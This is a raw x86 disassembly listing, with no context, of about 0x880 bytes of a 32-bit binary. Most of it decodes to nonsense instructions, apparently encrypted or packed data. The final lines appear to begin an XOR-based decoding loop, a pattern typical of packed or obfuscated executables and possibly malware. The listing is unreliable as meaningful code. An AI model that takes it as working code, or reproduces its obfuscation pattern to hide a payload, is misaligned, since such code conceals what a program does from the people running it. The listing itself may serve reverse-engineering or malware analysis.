  41818c:	fdivr  DWORD PTR [edi-0x2a152d3b]
  418192:	mov    ebp,0xcdf0ffbe
  418197:	sti    
  418198:	push   es
  418199:	add    bh,al
  41819b:	or     cl,BYTE PTR [edi]
  41819d:	push   es
  41819e:	or     ah,dl
  4181a0:	into   
  4181a1:	clc    
  4181a2:	shl    DWORD PTR [edx-0x361c5330],cl
  4181a8:	sti    
  4181a9:	repz shr cl,cl
  4181ac:	icebp  
  4181ad:	aad    0xf6
  4181af:	hlt    
  4181b0:	add    al,bl
  4181b2:	(bad)  
  4181b3:	int    0xc2
  4181b5:	int    0xbb
  4181b7:	add    edi,esp
  4181b9:	fnstcw WORD PTR [edi-0x2391107]
  4181bf:	enter  0xd209,0xd0
  4181c3:	(bad)
  4181c6:	shr    edi,0xb3
  4181c9:	call   0xf7273696
  4181ce:	rol    DWORD PTR [ebx],1
  4181d0:	jmp    0xfd03:0xbde8d4d1
  4181d7:	repnz fadd QWORD PTR [ecx]
  4181da:	fld    QWORD PTR [esi+eiz*8]
  4181dd:	fcmovnu st,st(3)
  4181df:	jmp    0x4181bf
  4181e1:	fdivr  QWORD PTR [esi-0x4f124315]
  4181e7:	loop   0x4181d6
  4181e9:	loopne 0x4181a4
  4181eb:	scas   al,BYTE PTR es:[edi]
  4181ec:	lock mov bh,0xc4
  4181ef:	iret   
  4181f0:	std    
  4181f1:	into   
  4181f2:	imul   edi
  4181f4:	test   al,0xd3
  4181f7:	mov    ebp,0xd5f8d7f8
  4181fc:	aad    0xc8
  4181fe:	ud2    
  418200:	fsub   st,st(5)
  418202:	out    0xc4,eax
  418204:	(bad)
  418207:	into   
  418208:	mov    ah,0xa8
  41820a:	mov    ecx,0xd9b0cae4
  41820f:	fptan  
  418211:	add    eax,edi
  418213:	fcmovu st,st(6)
  418215:	aam    0xbd
  418217:	(bad)  
  418219:	or     dl,cl
  41821b:	jecxz  0x41821e
  41821d:	call   0xc10c8003
  418222:	shl    BYTE PTR [eax-0x4c2f3842],cl
  418228:	shl    edx,cl
  41822a:	int3   
  41822b:	mov    eax,0xbddecfe7
  418230:	call   0xd0105b09
  418235:	cli    
  418236:	clc    
  418237:	int3   
  418238:	add    ah,al
  41823a:	neg    esi
  41823c:	out    dx,al
  41823d:	cmc    
  41823e:	add    ecx,ebx
  418240:	in     al,dx
  418241:	enter  0xcca9,0xea
  418245:	lods   eax,DWORD PTR ds:[esi]
  418246:	iret   
  418247:	ror    ch,cl
  418249:	test   al,0xcc
  41824b:	(bad)  
  41824d:	icebp  
  41824e:	fsubr  st(3),st
  418250:	(bad)  
  418251:	ret    0xbadc
  418254:	mov    esp,0x5be0102
  418259:	jmp    0x41825f
  41825b:	push   es
  41825c:	fucomip st,st(2)
  41825e:	(bad)
  418262:	(bad)  
  418263:	icebp  
  418264:	fcomip st,st(1)
  418266:	mov    bh,0xc7
  418268:	out    dx,al
  418269:	mov    dh,0xf5
  41826b:	enter  0xcff2,0xf2
  41826f:	mov    ebx,0xdccefce3
  418274:	mov    esi,0xc4c7edf4
  418279:	(bad)  
  41827a:	aad    0xd7
  41827c:	(bad)  
  41827d:	dec    DWORD PTR [esi]
  41827f:	(bad)  
  418281:	in     eax,dx
  418282:	repz in al,0xad
  418285:	in     eax,0xb5
  418287:	hlt    
  418288:	(bad)  
  418289:	repnz in eax,dx
  41828b:	mov    dh,0xb6
  41828d:	sti    
  41828e:	ror    ch,cl
  418290:	enter  0xe9fb,0xf3
  418294:	repnz stc 
  418296:	add    esi,ebx
  418298:	aam    0xff
  41829a:	or     DWORD PTR [eax],eax
  41829c:	add    BYTE PTR [edx],cl
  41829e:	jmp    0x4182a5
  4182a0:	loope  0x4182a8
  4182a2:	test   eax,0xb6ebbde3
  4182a7:	(bad)  
  4182a8:	jmp    0xfa0f74a7
  4182ad:	mov    edi,0xe8d6bfdd
  4182b2:	aam    0x0
  4182b4:	out    0xda,al
  4182b6:	sar    esp,0xc7
  4182b9:	cli    
  4182ba:	(bad)  
  4182bb:	xlat   BYTE PTR ds:[ebx]
  4182bc:	retf   0xcfcf
  4182bf:	(bad)  
  4182c0:	in     al,dx
  4182c1:	out    dx,al
  4182c2:	out    dx,al
  4182c3:	mov    ebp,0xebebb2dc
  4182c8:	enter  0xf1f9,0xce
  4182cc:	mov    ah,0xee
  4182ce:	mov    ch,0xfc
  4182d0:	jmp    0x3b8:0xc100c2d7
  4182d7:	add    ah,dl
  4182d9:	add    eax,esp
  4182db:	aam    0xa
  4182dd:	(bad)  
  4182de:	cmc    
  4182df:	hlt    
  4182e0:	out    dx,eax
  4182e1:	loop   0x4182bf
  4182e3:	shl    BYTE PTR [ebx-0x56162d24],0xf0
  4182ea:	mov    bl,0xff
  4182ec:	mov    ch,0xb7
  4182ee:	fnstsw WORD PTR [esi-0x1c47fc2c]
  4182f4:	add    al,BYTE PTR [esi]
  4182f6:	in     eax,0xfb
  4182f8:	add    ebp,eax
  4182fa:	std    
  4182fb:	fdivr  st,st(6)
  4182fd:	jmp    0xd8ca:0xc8e0fcdc
  418304:	mov    al,0xbd
  418306:	mov    dh,0xdc
  418308:	sar    bl,cl
  41830a:	clc    
  41830b:	mov    bh,0xcf
  41830d:	fidivr WORD PTR [ebp-0x8442325]
  418313:	fstp   st(1)
  418315:	clc    
  418316:	(bad)  
  418317:	icebp  
  418318:	pop    es
  418319:	rol    eax,0xc9
  41831c:	pop    es
  41831d:	loopne 0x418309
  41831f:	or     ebx,edx
  418321:	iret   
  418322:	in     eax,0xb3
  418324:	in     eax,0xa8
  418326:	(bad)  
  418328:	aam    0xe2
  41832a:	clc    
  41832b:	repz mov edx,0xebf4b8f6
  418331:	ret    
  418332:	sti    
  418333:	int    0xc2
  418335:	(bad)  
  418336:	cli    
  418337:	std    
  418338:	loope  0x418323
  41833a:	sti    
  41833b:	xlat   BYTE PTR ds:[ebx]
  41833c:	dec    BYTE PTR [ecx]
  41833e:	or     al,0xe7
  418340:	push   es
  418341:	or     edx,ebp
  418343:	ret    0xd6d1
  418346:	mov    cl,0xd0
  418348:	(bad)  
  418349:	jmp    0xf8ce:0xcfd9f5ef
  418350:	cli    
  418351:	add    cl,bh
  418353:	pop    es
  418354:	(bad)  
  418355:	mov    edi,0xe10007fe
  41835a:	(bad)  
  41835b:	in     al,0x2
  41835d:	or     bh,dh
  41835f:	jmp    0x41832f
  418361:	pop    es
  418362:	mov    dl,0xca
  418364:	(bad)
  418367:	jmp    0x41835f
  418369:	test   al,0xca
  41836b:	idiv   dh
  41836d:	push   eax
  41836f:	cli    
  418370:	(bad)  
  418372:	repz clc 
  418374:	frstpm(287 only) 
  418376:	repz icebp 
  418378:	(bad)  
  418379:	mov    esp,0xceeec2bf
  41837e:	loopne 0x418362
  418380:	pop    es
  418381:	jmp    0xd1ad:0xc5dcdeb9
  418388:	out    0xeb,al
  41838a:	mov    al,0xce
  41838c:	fidiv  DWORD PTR [ebp-0x260a0601]
  418392:	add    cl,ah
  418394:	add    al,BYTE PTR [ebx]
  418396:	in     al,dx
  418397:	cld    
  418398:	imul   edx
  41839a:	fstp   st(6)
  41839c:	out    dx,al
  41839d:	cld    
  41839e:	stc    
  41839f:	in     al,dx
  4183a0:	in     eax,dx
  4183a1:	clc    
  4183a2:	ror    edx,1
  4183a4:	rol    ebp,cl
  4183a6:	scas   al,BYTE PTR es:[edi]
  4183a7:	icebp  
  4183a8:	iret   
  4183a9:	loopne 0x418373
  4183ab:	repz fxch st(2)
  4183ae:	mov    bl,0xc8
  4183b0:	mov    eax,0xd4deeff2
  4183b5:	pop    es
  4183b6:	mov    ebx,0xd0e9fa00
  4183bb:	aad    0xc8
  4183bd:	(bad)  
  4183bf:	sti    
  4183c0:	or     al,0xe8
  4183c2:	(bad)
  4183c5:	out    dx,al
  4183c6:	call   0xcf3c67b4
  4183cb:	mov    dl,0xf3
  4183cd:	int3   
  4183ce:	rcr    ecx,cl
  4183d0:	int3   
  4183d1:	fstp   st(4)
  4183d3:	dec    bh
  4183d5:	shl    ecx,cl
  4183d7:	fdivr  st(0),st
  4183d9:	in     al,0xde
  4183db:	loop   0x4183dd
  4183dd:	stc    
  4183de:	stc    
  4183df:	(bad)  
  4183e0:	leave  
  4183e1:	jmp    0x4183c8
  4183e3:	mov    al,0xb0
  4183e5:	in     eax,dx
  4183e6:	rol    ebp,1
  4183e8:	int    0xc5
  4183ea:	retf   0xd3e0
  4183ed:	(bad)  
  4183ee:	std    
  4183ef:	clc    
  4183f0:	fcmovbe st,st(4)
  4183f2:	rol    ecx,0xbe
  4183f5:	int    0xf1
  4183f7:	aad    0xe7
  4183f9:	jmp    0xde3087fa
  4183fe:	or     eax,0xdccf0dc6
  418403:	out    0xc5,eax
  418405:	scas   al,BYTE PTR es:[edi]
  418406:	out    dx,eax
  418407:	mov    bl,0xed
  418409:	mov    bh,0xe1
  41840b:	in     eax,dx
  41840c:	shl    edx,cl
  41840e:	mov    bh,0xcc
  418410:	add    edi,DWORD PTR [ecx-0x33041237]
  418416:	fnstsw WORD PTR [ebp+edi*4-0x2a262129]
  41841d:	fcomp  st(0)
  41841f:	out    0xfe,al
  418421:	fld    st(6)
  418423:	in     eax,dx
  418424:	ret    0xe6d0
  418427:	mov    esp,0xe7d6d0e3
  41842c:	icebp  
  41842d:	mov    eax,0xd8badab7
  418432:	call   0xf9095a35
  418437:	ffree  st(0)
  418439:	fsub   st(2),st
  41843b:	add    edx,esp
  41843d:	out    0xfd,eax
  41843f:	in     eax,0xe8
  418441:	(bad)  
  418442:	fistp  QWORD PTR [edi-0x18493b0e]
  418448:	aam    0xbb
  41844a:	sti    
  41844b:	mov    cl,0xd2
  41844d:	mov    ch,0xf0
  41844f:	jmp    0x418447
  418451:	int3   
  418452:	hlt    
  418453:	add    dh,dl
  418455:	add    edi,DWORD PTR [edi-0x18001d1c]
  41845b:	clc    
  41845c:	call   ebp
  41845e:	aam    0xcd
  418460:	(bad)  
  418462:	enter  0xcaae,0xee
  418466:	out    dx,eax
  418467:	loopne 0x41842a
  418469:	jmp    0xf7b8:0xccb6b8c0
  418470:	cli    
  418471:	cmc    
  418472:	add    edx,eax
  418474:	into   
  418475:	int    0xe1
  418477:	(bad)  
  418478:	std    
  418479:	std    
  41847a:	or     ecx,DWORD PTR [eax]
  41847c:	out    0xea,al
  41847e:	enter  0xef13,0xf
  418482:	(bad)  
  418483:	mul    esp
  418485:	out    dx,eax
  418486:	scas   al,BYTE PTR es:[edi]
  418487:	ret    
  418488:	rcl    ebx,0xb5
  41848b:	(bad)  
  41848c:	in     al,dx
  41848d:	fdivp  st(6),st
  41848f:	div    ecx
  418491:	in     al,dx
  418492:	fdivr  QWORD PTR [ecx-0xe251cfe]
  418498:	ffree  st(6)
  41849a:	fdivr  st,st(2)
  41849c:	push   cs
  41849d:	enter  0xfaeb,0xeb
  4184a1:	add    al,0xde
  4184a3:	scas   al,BYTE PTR es:[edi]
  4184a4:	shr    esp,1
  4184a6:	shl    ch,0xd0
  4184a9:	(bad)  
  4184ab:	lock retf 0xfece
  4184af:	retf   0xbdfa
  4184b2:	fdiv   st(5),st
  4184b4:	mov    eax,0xd0f7f8ee
  4184b9:	(bad)  
  4184ba:	loop   0x4184b9
  4184bc:	jmp    0xc54b8c99
  4184c1:	into   
  4184c2:	jmp    0x418488
  4184c4:	scas   al,BYTE PTR es:[edi]
  4184c5:	lock leave 
  4184c7:	jmp    0xe82631b5
  4184cc:	jmp    0x4184a2
  4184ce:	mov    ecx,0xd9ead1ff
  4184d3:	mov    eax,0xfd05f1c2
  4184d8:	faddp  st(0),st
  4184da:	or     bl,al
  4184dc:	iret   
  4184dd:	add    edi,eax
  4184df:	call   0xf42582ca
  4184e4:	test   al,0xdc
  4184e6:	icebp  
  4184e7:	rol    bh,0xcd
  4184ea:	stc    
  4184eb:	into   
  4184ec:	(bad)  
  4184ed:	out    0xca,al
  4184ef:	in     al,dx
  4184f0:	clc    
  4184f1:	ret    
  4184f2:	in     al,dx
  4184f3:	mov    ebp,0xddd4def3
  4184f8:	retf   
  4184f9:	shl    edi,1
  4184fb:	add    esp,ebx
  4184fd:	jecxz  0x4184da
  4184ff:	loop   0x418504
  418501:	sar    BYTE PTR [edi-0x3b385038],cl
  418507:	mov    ah,0xe5
  418509:	repnz cmc 
  41850b:	ror    edx,cl
  41850d:	fcmovbe st,st(1)
  41850f:	sti    
  418510:	call   esp
  418512:	ret    0xfeba
  418515:	mov    ah,0xe1
  418517:	loopne 0x418509
  418519:	loope  0x418503
  41851b:	(bad)  
  41851d:	or     cl,BYTE PTR [edi]
  41851f:	fsub   st(4),st
  418521:	or     al,bl
  418523:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418524:	jmp    0x4184d4
  418526:	out    0xc1,eax
  418528:	shr    DWORD PTR [edi+edx*8-0x490c4a2f],1
  41852f:	mov    ch,0xb4
  418531:	repz add cl,dl
  418534:	int3   
  418535:	rol    BYTE PTR [eax],0x0
  418538:	ret    0xc4c4
  41853b:	jecxz  0x41852c
  41853d:	stc    
  41853e:	add    al,0xc9
  418540:	stc    
  418541:	in     al,0xe9
  418543:	faddp  st(5),st
  418545:	lock xlat BYTE PTR ds:[ebx]
  418547:	mov    dh,0xb0
  418549:	fucompp 
  41854b:	mov    al,0xeb
  41854d:	idiv   BYTE PTR [esi-0x2903fc45]
  418553:	aam    0xdd
  418555:	rcl    ebx,0xe2
  418558:	(bad)  
  418559:	out    0xf0,eax
  41855b:	aad    0xde
  41855d:	(bad)  
  41855e:	add    BYTE PTR [eax],cl
  418560:	or     eax,0xb0c7b1e1
  418565:	icebp  
  418566:	in     eax,dx
  418567:	jmp    0xb806742f
  41856c:	mov    edi,0xdee9dcde
  418571:	out    dx,al
  418572:	rcr    esp,cl
  418574:	loopne 0x41856e
  418576:	icebp  
  418577:	or     eax,ecx
  418579:	not    ebp
  41857b:	add    al,0xf6
  41857d:	cmc    
  41857e:	cld    
  41857f:	call   0xf4258384
  418584:	out    dx,eax
  418585:	into   
  418586:	mov    bl,0xea
  418588:	leave  
  418589:	in     eax,0xcd
  41858b:	fldl2t 
  41858d:	out    0xc9,al
  41858f:	cmc    
  418590:	mov    edi,0xd6d4dadd
  418595:	stc    
  418596:	loop   0x418556
  418598:	or     edi,edi
  41859a:	clc    
  41859b:	retf   
  41859c:	pop    es
  41859d:	faddp  st(3),st
  41859f:	(bad)  
  4185a0:	cli    
  4185a1:	add    eax,0xf3c5d8e3
  4185a6:	loope  0x41859c
  4185a8:	lds    edi,FWORD PTR [ebx-0x28083826]
  4185ae:	sar    dh,cl
  4185b0:	fcmovnbe st,st(4)
  4185b2:	in     eax,dx
  4185b3:	lock loope 0x418579
  4185b6:	(bad)  
  4185b7:	lock aam 0xd5
  4185ba:	loopne 0x4185ba
  4185bc:	add    dl,cl
  4185be:	aad    0x4
  4185c0:	shr    esi,0xd0
  4185c3:	mov    dl,0xe5
  4185c5:	xlat   BYTE PTR ds:[ebx]
  4185c6:	in     al,dx
  4185c7:	(bad)  
  4185c8:	in     al,dx
  4185c9:	retf   0xd5d6
  4185cc:	aad    0xeb
  4185ce:	ror    dl,1
  4185d0:	lock fsubrp st(2),st
  4185d3:	loope  0x4185c3
  4185d5:	xlat   BYTE PTR ds:[ebx]
  4185d6:	(bad)  
  4185d7:	shl    bh,cl
  4185d9:	add    DWORD PTR [ecx],eax
  4185db:	rcl    ch,0xf5
  4185de:	(bad)  
  4185e0:	adc    edx,ebx
  4185e2:	(bad)  
  4185e4:	div    DWORD PTR [eax-0x253e2c4a]
  4185ea:	leave  
  4185eb:	mov    bh,0xbf
  4185ed:	out    dx,eax
  4185ee:	sar    ebx,1
  4185f0:	lock cmc 
  4185f2:	mov    esp,0xecbcdcc3
  4185f7:	mov    esi,0xd9fdd403
  4185fc:	(bad)  
  4185fd:	or     eax,ecx
  4185ff:	pop    es
  418600:	add    ch,dl
  418602:	out    0xa6,al
  418604:	in     al,dx
  418605:	rol    dl,cl
  418607:	repz (bad) 
  41860a:	cmc    
  41860b:	mov    dl,0xd6
  41860d:	(bad)  
  41860e:	into   
  41860f:	mov    edx,0xdbdddffe
  418614:	add    ah,ch
  418616:	fcmovnb st,st(7)
  418618:	pop    es
  418619:	jmp    0x4185fd
  41861b:	shl    ecx,0xed
  41861e:	in     eax,dx
  41861f:	fdiv   st(1),st
  418621:	fldcw  WORD PTR [esi-0x311d142f]
  418627:	fsub   st(4),st
  418629:	shr    al,cl
  41862b:	mov    cl,0xc6
  41862d:	mov    dh,0xea
  41862f:	mov    ebx,0xccbadaf8
  418634:	mov    eax,0xf8d4dbfc
  41863a:	std    
  41863b:	fcmovnu st,st(3)
  41863d:	loopne 0x418607
  41863f:	out    dx,al
  418640:	or     al,0xcf
  418642:	repnz fidiv WORD PTR [ecx-0x152d4e2e]
  418649:	repnz repnz (bad) 
  41864c:	enter  0xcad6,0xb6
  418650:	icebp  
  418651:	repnz fcmovu st,st(1)
  418654:	(bad)  
  418655:	fiadd  DWORD PTR ds:0xebf7c4be
  41865b:	add    dh,bl
  41865d:	aam    0xfc
  41865f:	std    
  418660:	int    0xdf
  418662:	(bad)
  418665:	icebp  
  418666:	aam    0xf2
  418668:	lock int 0xeb
  41866b:	loopne 0x418668
  41866d:	(bad)
  418670:	mov    edi,0xbcb8c1bd
  418675:	add    dl,bl
  418677:	out    0xbd,eax
  418679:	shl    edx,0xf9
  41867c:	jmp    0xe8cf:0xc4d8ddbc
  418683:	rol    esi,0xe3
  418686:	mov    bh,0xcb
  418688:	lods   al,BYTE PTR ds:[esi]
  418689:	in     al,dx
  41868a:	lock retf 0xd5ec
  41868e:	ror    edi,1
  418690:	jmp    0x41867b
  418692:	loopne 0x41865c
  418694:	rol    BYTE PTR [eax],1
  418696:	cld    
  418697:	loope  0x41866f
  418699:	std    
  41869a:	add    dl,bl
  41869c:	fld    QWORD PTR [ecx]
  41869e:	fimul  DWORD PTR [ebx]
  4186a0:	loope  0x4186a4
  4186a2:	loop   0x418693
  4186a4:	fucomip st,st(7)
  4186a6:	ret    
  4186a7:	out    dx,al
  4186a8:	(bad)
  4186ac:	in     eax,0xb8
  4186ae:	dec    ecx
  4186b0:	(bad)  
  4186b2:	mov    edx,0xfaedbefe
  4186b7:	loopne 0x4186be
  4186b9:	(bad)
  4186bc:	fdiv   st(2),st
  4186be:	(bad)  
  4186bf:	cld    
  4186c0:	or     eax,0xbcace7fc
  4186c5:	lods   al,BYTE PTR ds:[esi]
  4186c6:	loop   0x4186ba
  4186c8:	(bad)
  4186cb:	lock shl DWORD PTR [eax+0x3b9ccde],cl
  4186d2:	not    bl
  4186d4:	int    0xc3
  4186d6:	out    0xe3,al
  4186d8:	retf   
  4186d9:	in     eax,0xfd
  4186db:	add    ebx,eax
  4186dd:	fcmove st,st(6)
  4186df:	jmp    0xafc2:0xaaaf0ae9
  4186e6:	(bad)  
  4186e7:	ret    
  4186e8:	int    0xcf
  4186ea:	enter  0xb5f6,0xd7
  4186ee:	mov    bh,0xb5
  4186f0:	repz bnd ret 
  4186f3:	xlat   BYTE PTR ds:[ebx]
  4186f4:	out    0xee,al
  4186f6:	fstp   TBYTE PTR [esi-0x3e1b0a1b]
  4186fc:	call   0xde508fbd
  418701:	adc    edi,DWORD PTR [eax+esi*8-0x2b0e5233]
  418708:	mov    ch,0xf5
  41870a:	mov    ah,0xc8
  41870c:	(bad)
  41870f:	out    dx,al
  418710:	cli    
  418711:	fcmovnu st,st(7)
  418713:	neg    esp
  418715:	repz ret 
  418717:	test   BYTE PTR [eax],0xfb
  41871a:	lock (bad) 
  41871c:	cld    
  41871d:	push   cs
  41871e:	fucomi st,st(4)
  418720:	stc    
  418721:	fcomp  st(5)
  418723:	int    0xf7
  418725:	shl    esi,cl
  418727:	rcl    esi,cl
  418729:	jmp    0xb2de:0xe8c5f1d8
  418730:	into   
  418731:	out    dx,eax
  418732:	sar    edi,cl
  418734:	lock fcomip st,st(4)
  418737:	mov    ebp,0xf7d6d2e6
  41873c:	aam    0xe3
  41873e:	retf   
  41873f:	out    0xd3,eax
  418741:	in     al,dx
  418742:	leave  
  418743:	mov    edi,0xcfcfdead
  418748:	int    0xd4
  41874a:	in     eax,dx
  41874b:	mov    eax,0xf2bde8d2
  418750:	fadd   st(3),st
  418752:	add    ecx,ebx
  418754:	cld    
  418755:	add    esp,esp
  418757:	fdecstp 
  418759:	in     eax,0xda
  41875b:	dec    BYTE PTR [ebx]
  41875d:	add    esp,ebx
  41875f:	jmp    0xeee9:0xbee4c9db
  418766:	lods   al,BYTE PTR ds:[esi]
  418767:	int    0xc5
  418769:	(bad)  
  41876a:	cli    
  41876b:	mov    dh,0xd7
  41876d:	aad    0xdb
  41876f:	mov    ecx,0xcee0d6f5
  418774:	mov    esi,0xc300ffe5
  418779:	icebp  
  41877a:	jmp    0x4fd:0xa00c0f6
  418781:	shr    DWORD PTR [edi-0x11384841],cl
  418787:	lods   eax,DWORD PTR ds:[esi]
  418788:	rol    dl,1
  41878a:	jmp    0x418767
  41878c:	sar    DWORD PTR [edi-0x15202414],1
  418792:	ret    0xb5f0
  418795:	pop    es
  418796:	fcomip st,st(7)
  418798:	add    BYTE PTR [edx],cl
  41879a:	fsubp  st(1),st
  41879c:	std    
  41879d:	loop   0x418779
  41879f:	or     al,0x7
  4187a1:	int    0xef
  4187a3:	jmp    0x41876a
  4187a5:	out    0xe4,eax
  4187a7:	out    0xe9,al
  4187a9:	mov    ah,0xd9
  4187ab:	iret   
  4187ac:	jmp    0x41879a
  4187ae:	jmp    0x41879c
  4187b0:	shl    cl,cl
  4187b2:	inc    DWORD PTR [ebx]
  4187b4:	iret   
  4187b5:	out    0xd1,eax
  4187b7:	int3   
  4187b8:	repz icebp 
  4187ba:	std    
  4187bb:	sti    
  4187bc:	add    eax,0xcde8f408
  4187c1:	retf   0xece7
  4187c4:	jmp    0xd631736d
  4187c9:	hlt    
  4187ca:	clc    
  4187cb:	sar    cl,cl
  4187cd:	(bad)  
  4187ce:	cld    
  4187cf:	int    0xe3
  4187d1:	ret    
  4187d2:	mov    esp,0xd1b8d8b6
  4187d7:	fimul  WORD PTR [ebx]
  4187d9:	or     esp,esi
  4187db:	jmp    0xcf2b72c0
  4187e0:	out    0xc9,al
  4187e2:	test   al,0xd3
  4187e4:	iret   
  4187e5:	aad    0xc5
  4187e7:	xlat   BYTE PTR ds:[ebx]
  4187e8:	not    dl
  4187ea:	(bad)  
  4187eb:	xlat   BYTE PTR ds:[ebx]
  4187ec:	(bad)  
  4187ed:	out    dx,eax
  4187ee:	xlat   BYTE PTR ds:[ebx]
  4187ef:	jecxz  0x4187eb
  4187f1:	(bad)  
  4187f2:	repz out dx,eax
  4187f4:	add    al,ah
  4187f6:	(bad)  
  4187f7:	lock or dh,dh
  4187fa:	cld    
  4187fb:	(bad)  
  4187fc:	fmul   DWORD PTR ds:0xddeae605
  418802:	jmp    0x4187c5
  418804:	test   al,0xa8
  418806:	repnz rcl esp,0xf4
  41880a:	(bad)  
  41880b:	retf   
  41880c:	into   
  41880d:	mov    eax,0xe8fbd1b3
  418812:	add    cl,bl
  418814:	out    0xc0,al
  418816:	(bad)  
  418818:	ret    0x9c1
  41881b:	out    0xfc,al
  41881d:	test   bl,0xda
  418820:	in     al,dx
  418821:	(bad)  
  418822:	mov    edi,0xf5d6aee7
  418827:	rol    esi,cl
  418829:	(bad)
  41882c:	mov    cl,0xef
  41882e:	lock (bad) 
  418830:	shl    dl,cl
  418832:	mov    ebp,0xfff6b9ee
  418837:	mov    esp,0xd6c803d4
  41883d:	loopne 0x41882c
  41883f:	adc    ebx,ebp
  418841:	or     dh,BYTE PTR [edx-0xe361e3e]
  418847:	mov    bh,0xef
  418849:	in     eax,dx
  41884a:	shl    BYTE PTR [ebp-0x24454841],cl
  418850:	mov    esp,0xbdf1fabb
  418855:	(bad)  
  418857:	out    0xa,al
  418859:	dec    edx
  41885b:	dec    cl
  41885d:	test   cl,0x13
  418860:	add    dl,BYTE PTR [edx]
  418862:	shr    dl,0xcc
  418865:	cmc    
  418866:	(bad)  
  418867:	sti    
  418868:	lock icebp 
  41886a:	div    BYTE PTR [edi-0xc2a0411]
  418870:	int3   
  418871:	rcl    ebp,cl
  418873:	sar    DWORD PTR [esi-0x824202f],0xf5
  41887a:	in     al,0xd5
  41887c:	fcmovnu st,st(5)
  41887e:	add    eax,0xf3dc0fc8
  418883:	test   eax,0xcbd1c1d2
  418888:	cmc    
  418889:	lods   al,BYTE PTR ds:[esi]
  41888a:	mov    ah,0xd9
  41888c:	mov    ah,0xdb
  41888e:	stc    
  41888f:	fdivr  QWORD PTR [edi+0x7f7f4cf]
  418895:	ret    
  418896:	fdivp  st(5),st
  418898:	add    BYTE PTR [ebx],cl
  41889a:	out    0xf8,eax
  41889c:	call   0x341946c
  4188a1:	add    al,0xe6
  4188a3:	mov    esi,0xd3aef2cd
  4188a8:	rcl    edi,0xd7
  4188ab:	(bad)  
  4188ac:	cli    
  4188ad:	mov    dh,0xbf
  4188af:	clc    
  4188b0:	mov    eax,0xf7cffcd9
  4188b5:	mov    esp,0xf6c4ccc7
  4188ba:	or     DWORD PTR [edx],eax
  4188bc:	enter  0xe0d9,0xe9
  4188c0:	add    esp,ebx
  4188c2:	stos   BYTE PTR es:[edi],al
  4188c3:	ret    
  4188c4:	(bad)  
  4188c5:	jmp    0x418888
  4188c7:	mov    dh,0xf0
  4188c9:	out    dx,eax
  4188ca:	leave  
  4188cb:	repz mov dh,0xe4
  4188ce:	mov    ecx,0xd5bee9d4
  4188d3:	(bad)  
  4188d4:	(bad)  
  4188d5:	(bad)  
  4188d6:	fdivr  st(0),st
  4188d8:	in     al,0xe7
  4188da:	icebp  
  4188db:	sti    
  4188dc:	or     dl,bh
  4188de:	ret    
  4188df:	loope  0x4188a9
  4188e1:	push   es
  4188e2:	shr    BYTE PTR [esi-0x3a4d3432],cl
  4188e8:	(bad)  
  4188e9:	into   
  4188ea:	int    0xd0
  4188ec:	aad    0xd9
  4188ee:	int    0xf7
  4188f0:	leave  
  4188f1:	out    dx,eax
  4188f2:	clc    
  4188f3:	mov    dh,0xf4
  4188f5:	loop   0x4188c8
  4188f7:	pop    es
  4188f8:	or     ah,dl
  4188fa:	pop    es
  4188fb:	idiv   esi
  4188fd:	(bad)  
  4188fe:	fadd   DWORD PTR [ecx]
  418900:	fild   DWORD PTR [ebx]
  418902:	sar    DWORD PTR [eax-0x304f151a],1
  418908:	ret    
  418909:	iret   
  41890a:	mov    ecx,0xdedbdeae
  41890f:	stc    
  418910:	int    0xf7
  418912:	aam    0xf8
  418914:	ret    0xfbd3
  418917:	lock add eax,0xfff4c4e7
  41891d:	(bad)  
  41891e:	clc    
  41891f:	stc    
  418920:	(bad)
  418923:	out    dx,eax
  418924:	retf   
  418925:	mov    cl,0xaf
  418927:	sar    ebx,cl
  418929:	mov    ah,0xba
  41892b:	shl    esp,cl
  41892d:	out    dx,eax
  41892e:	mov    esi,0xb9f1b9e9
  418933:	enter  0xc7c3,0xbe
  418937:	push   es
  418938:	jecxz  0x41893a
  41893a:	sti    
  41893b:	jmp    0xb0c:0xf4cffbfa
  418942:	shl    esi,1
  418944:	loope  0x4188f9
  418946:	(bad)  
  418947:	lds    esi,FWORD PTR [edx-0x191b0406]
  41894d:	sar    bh,cl
  41894f:	cmc    
  418950:	jmp    0x41891b
  418952:	(bad)  
  418954:	push   es
  418955:	add    ah,cl
  418957:	icebp  
  418958:	(bad)  
  418959:	fxam   
  41895b:	in     eax,0xcb
  41895d:	push   cs
  41895e:	std    
  41895f:	fimul  DWORD PTR [eax+ebx*8]
  418962:	loope  0x41895b
  418964:	loopne 0x41891c
  418966:	out    dx,al
  418967:	mov    bh,0xc1
  418969:	hlt    
  41896a:	mov    ebx,0xf5b6bbb7
  41896f:	int3   
  418970:	(bad)  
  418971:	jecxz  0x418976
  418973:	pop    es
  418974:	ret    
  418975:	push   es
  418976:	add    ebx,esp
  418978:	push   es
  418979:	in     al,0xdd
  41897b:	jmp    0xf278f55
  418980:	pop    es
  418981:	out    0xb3,al
  418983:	(bad)  
  418984:	in     al,0xd1
  418986:	lock jecxz 0x418954
  418989:	int    0xe7
  41898b:	hlt    
  41898c:	mov    cl,0xb5
  41898e:	rcr    al,cl
  418990:	cld    
  418991:	mov    ebp,0xc7bfc8d9
  418996:	mov    esi,0xcbe9f3f5
  41899b:	fcomp  st(5)
  41899d:	cli    
  41899e:	(bad)  
  41899f:	adc    ebx,ebx
  4189a1:	pop    es
  4189a2:	jmp    0xc42d7a7f
  4189a7:	aam    0xe2
  4189a9:	iret   
  4189aa:	icebp  
  4189ab:	retf   
  4189ac:	fdivp  st(6),st
  4189ae:	lock mov dh,0xce
  4189b1:	retf   0xbcd3
  4189b4:	inc    BYTE PTR [ecx]
  4189b6:	ret    
  4189b7:	(bad)  
  4189ba:	out    0xcb,al
  4189bc:	loop   0x4189b3
  4189be:	loope  0x4189ad
  4189c0:	repz or al,0xea
  4189c3:	out    0x2b,eax
  4189c5:	sar    DWORD PTR [ebx],0xd0
  4189c8:	jne    0x418b19
  4189ce:	mov    eax,DWORD PTR [ebp-0x8]
  4189d1:	add    eax,DWORD PTR [ebp-0xd0]
  4189d7:	mov    al,BYTE PTR [eax]
  4189d9:	mov    BYTE PTR [ebp-0xf5],al
  4189df:	mov    eax,DWORD PTR [ebp-0xdc]
  4189e5:	xor    eax,0x75108b5
  4189ea:	add    eax,0x3272fb
  4189ef:	mov    DWORD PTR [ebp-0xfc],eax
  4189f5:	jmp    0x418a07
  4189fa:	mov    eax,DWORD PTR [ebp-0xfc]
  418a00:	inc    eax
  418a01:	mov    DWORD PTR [ebp-0xfc],eax
  418a07:	mov    eax,DWORD PTR [ebp-0xd8]
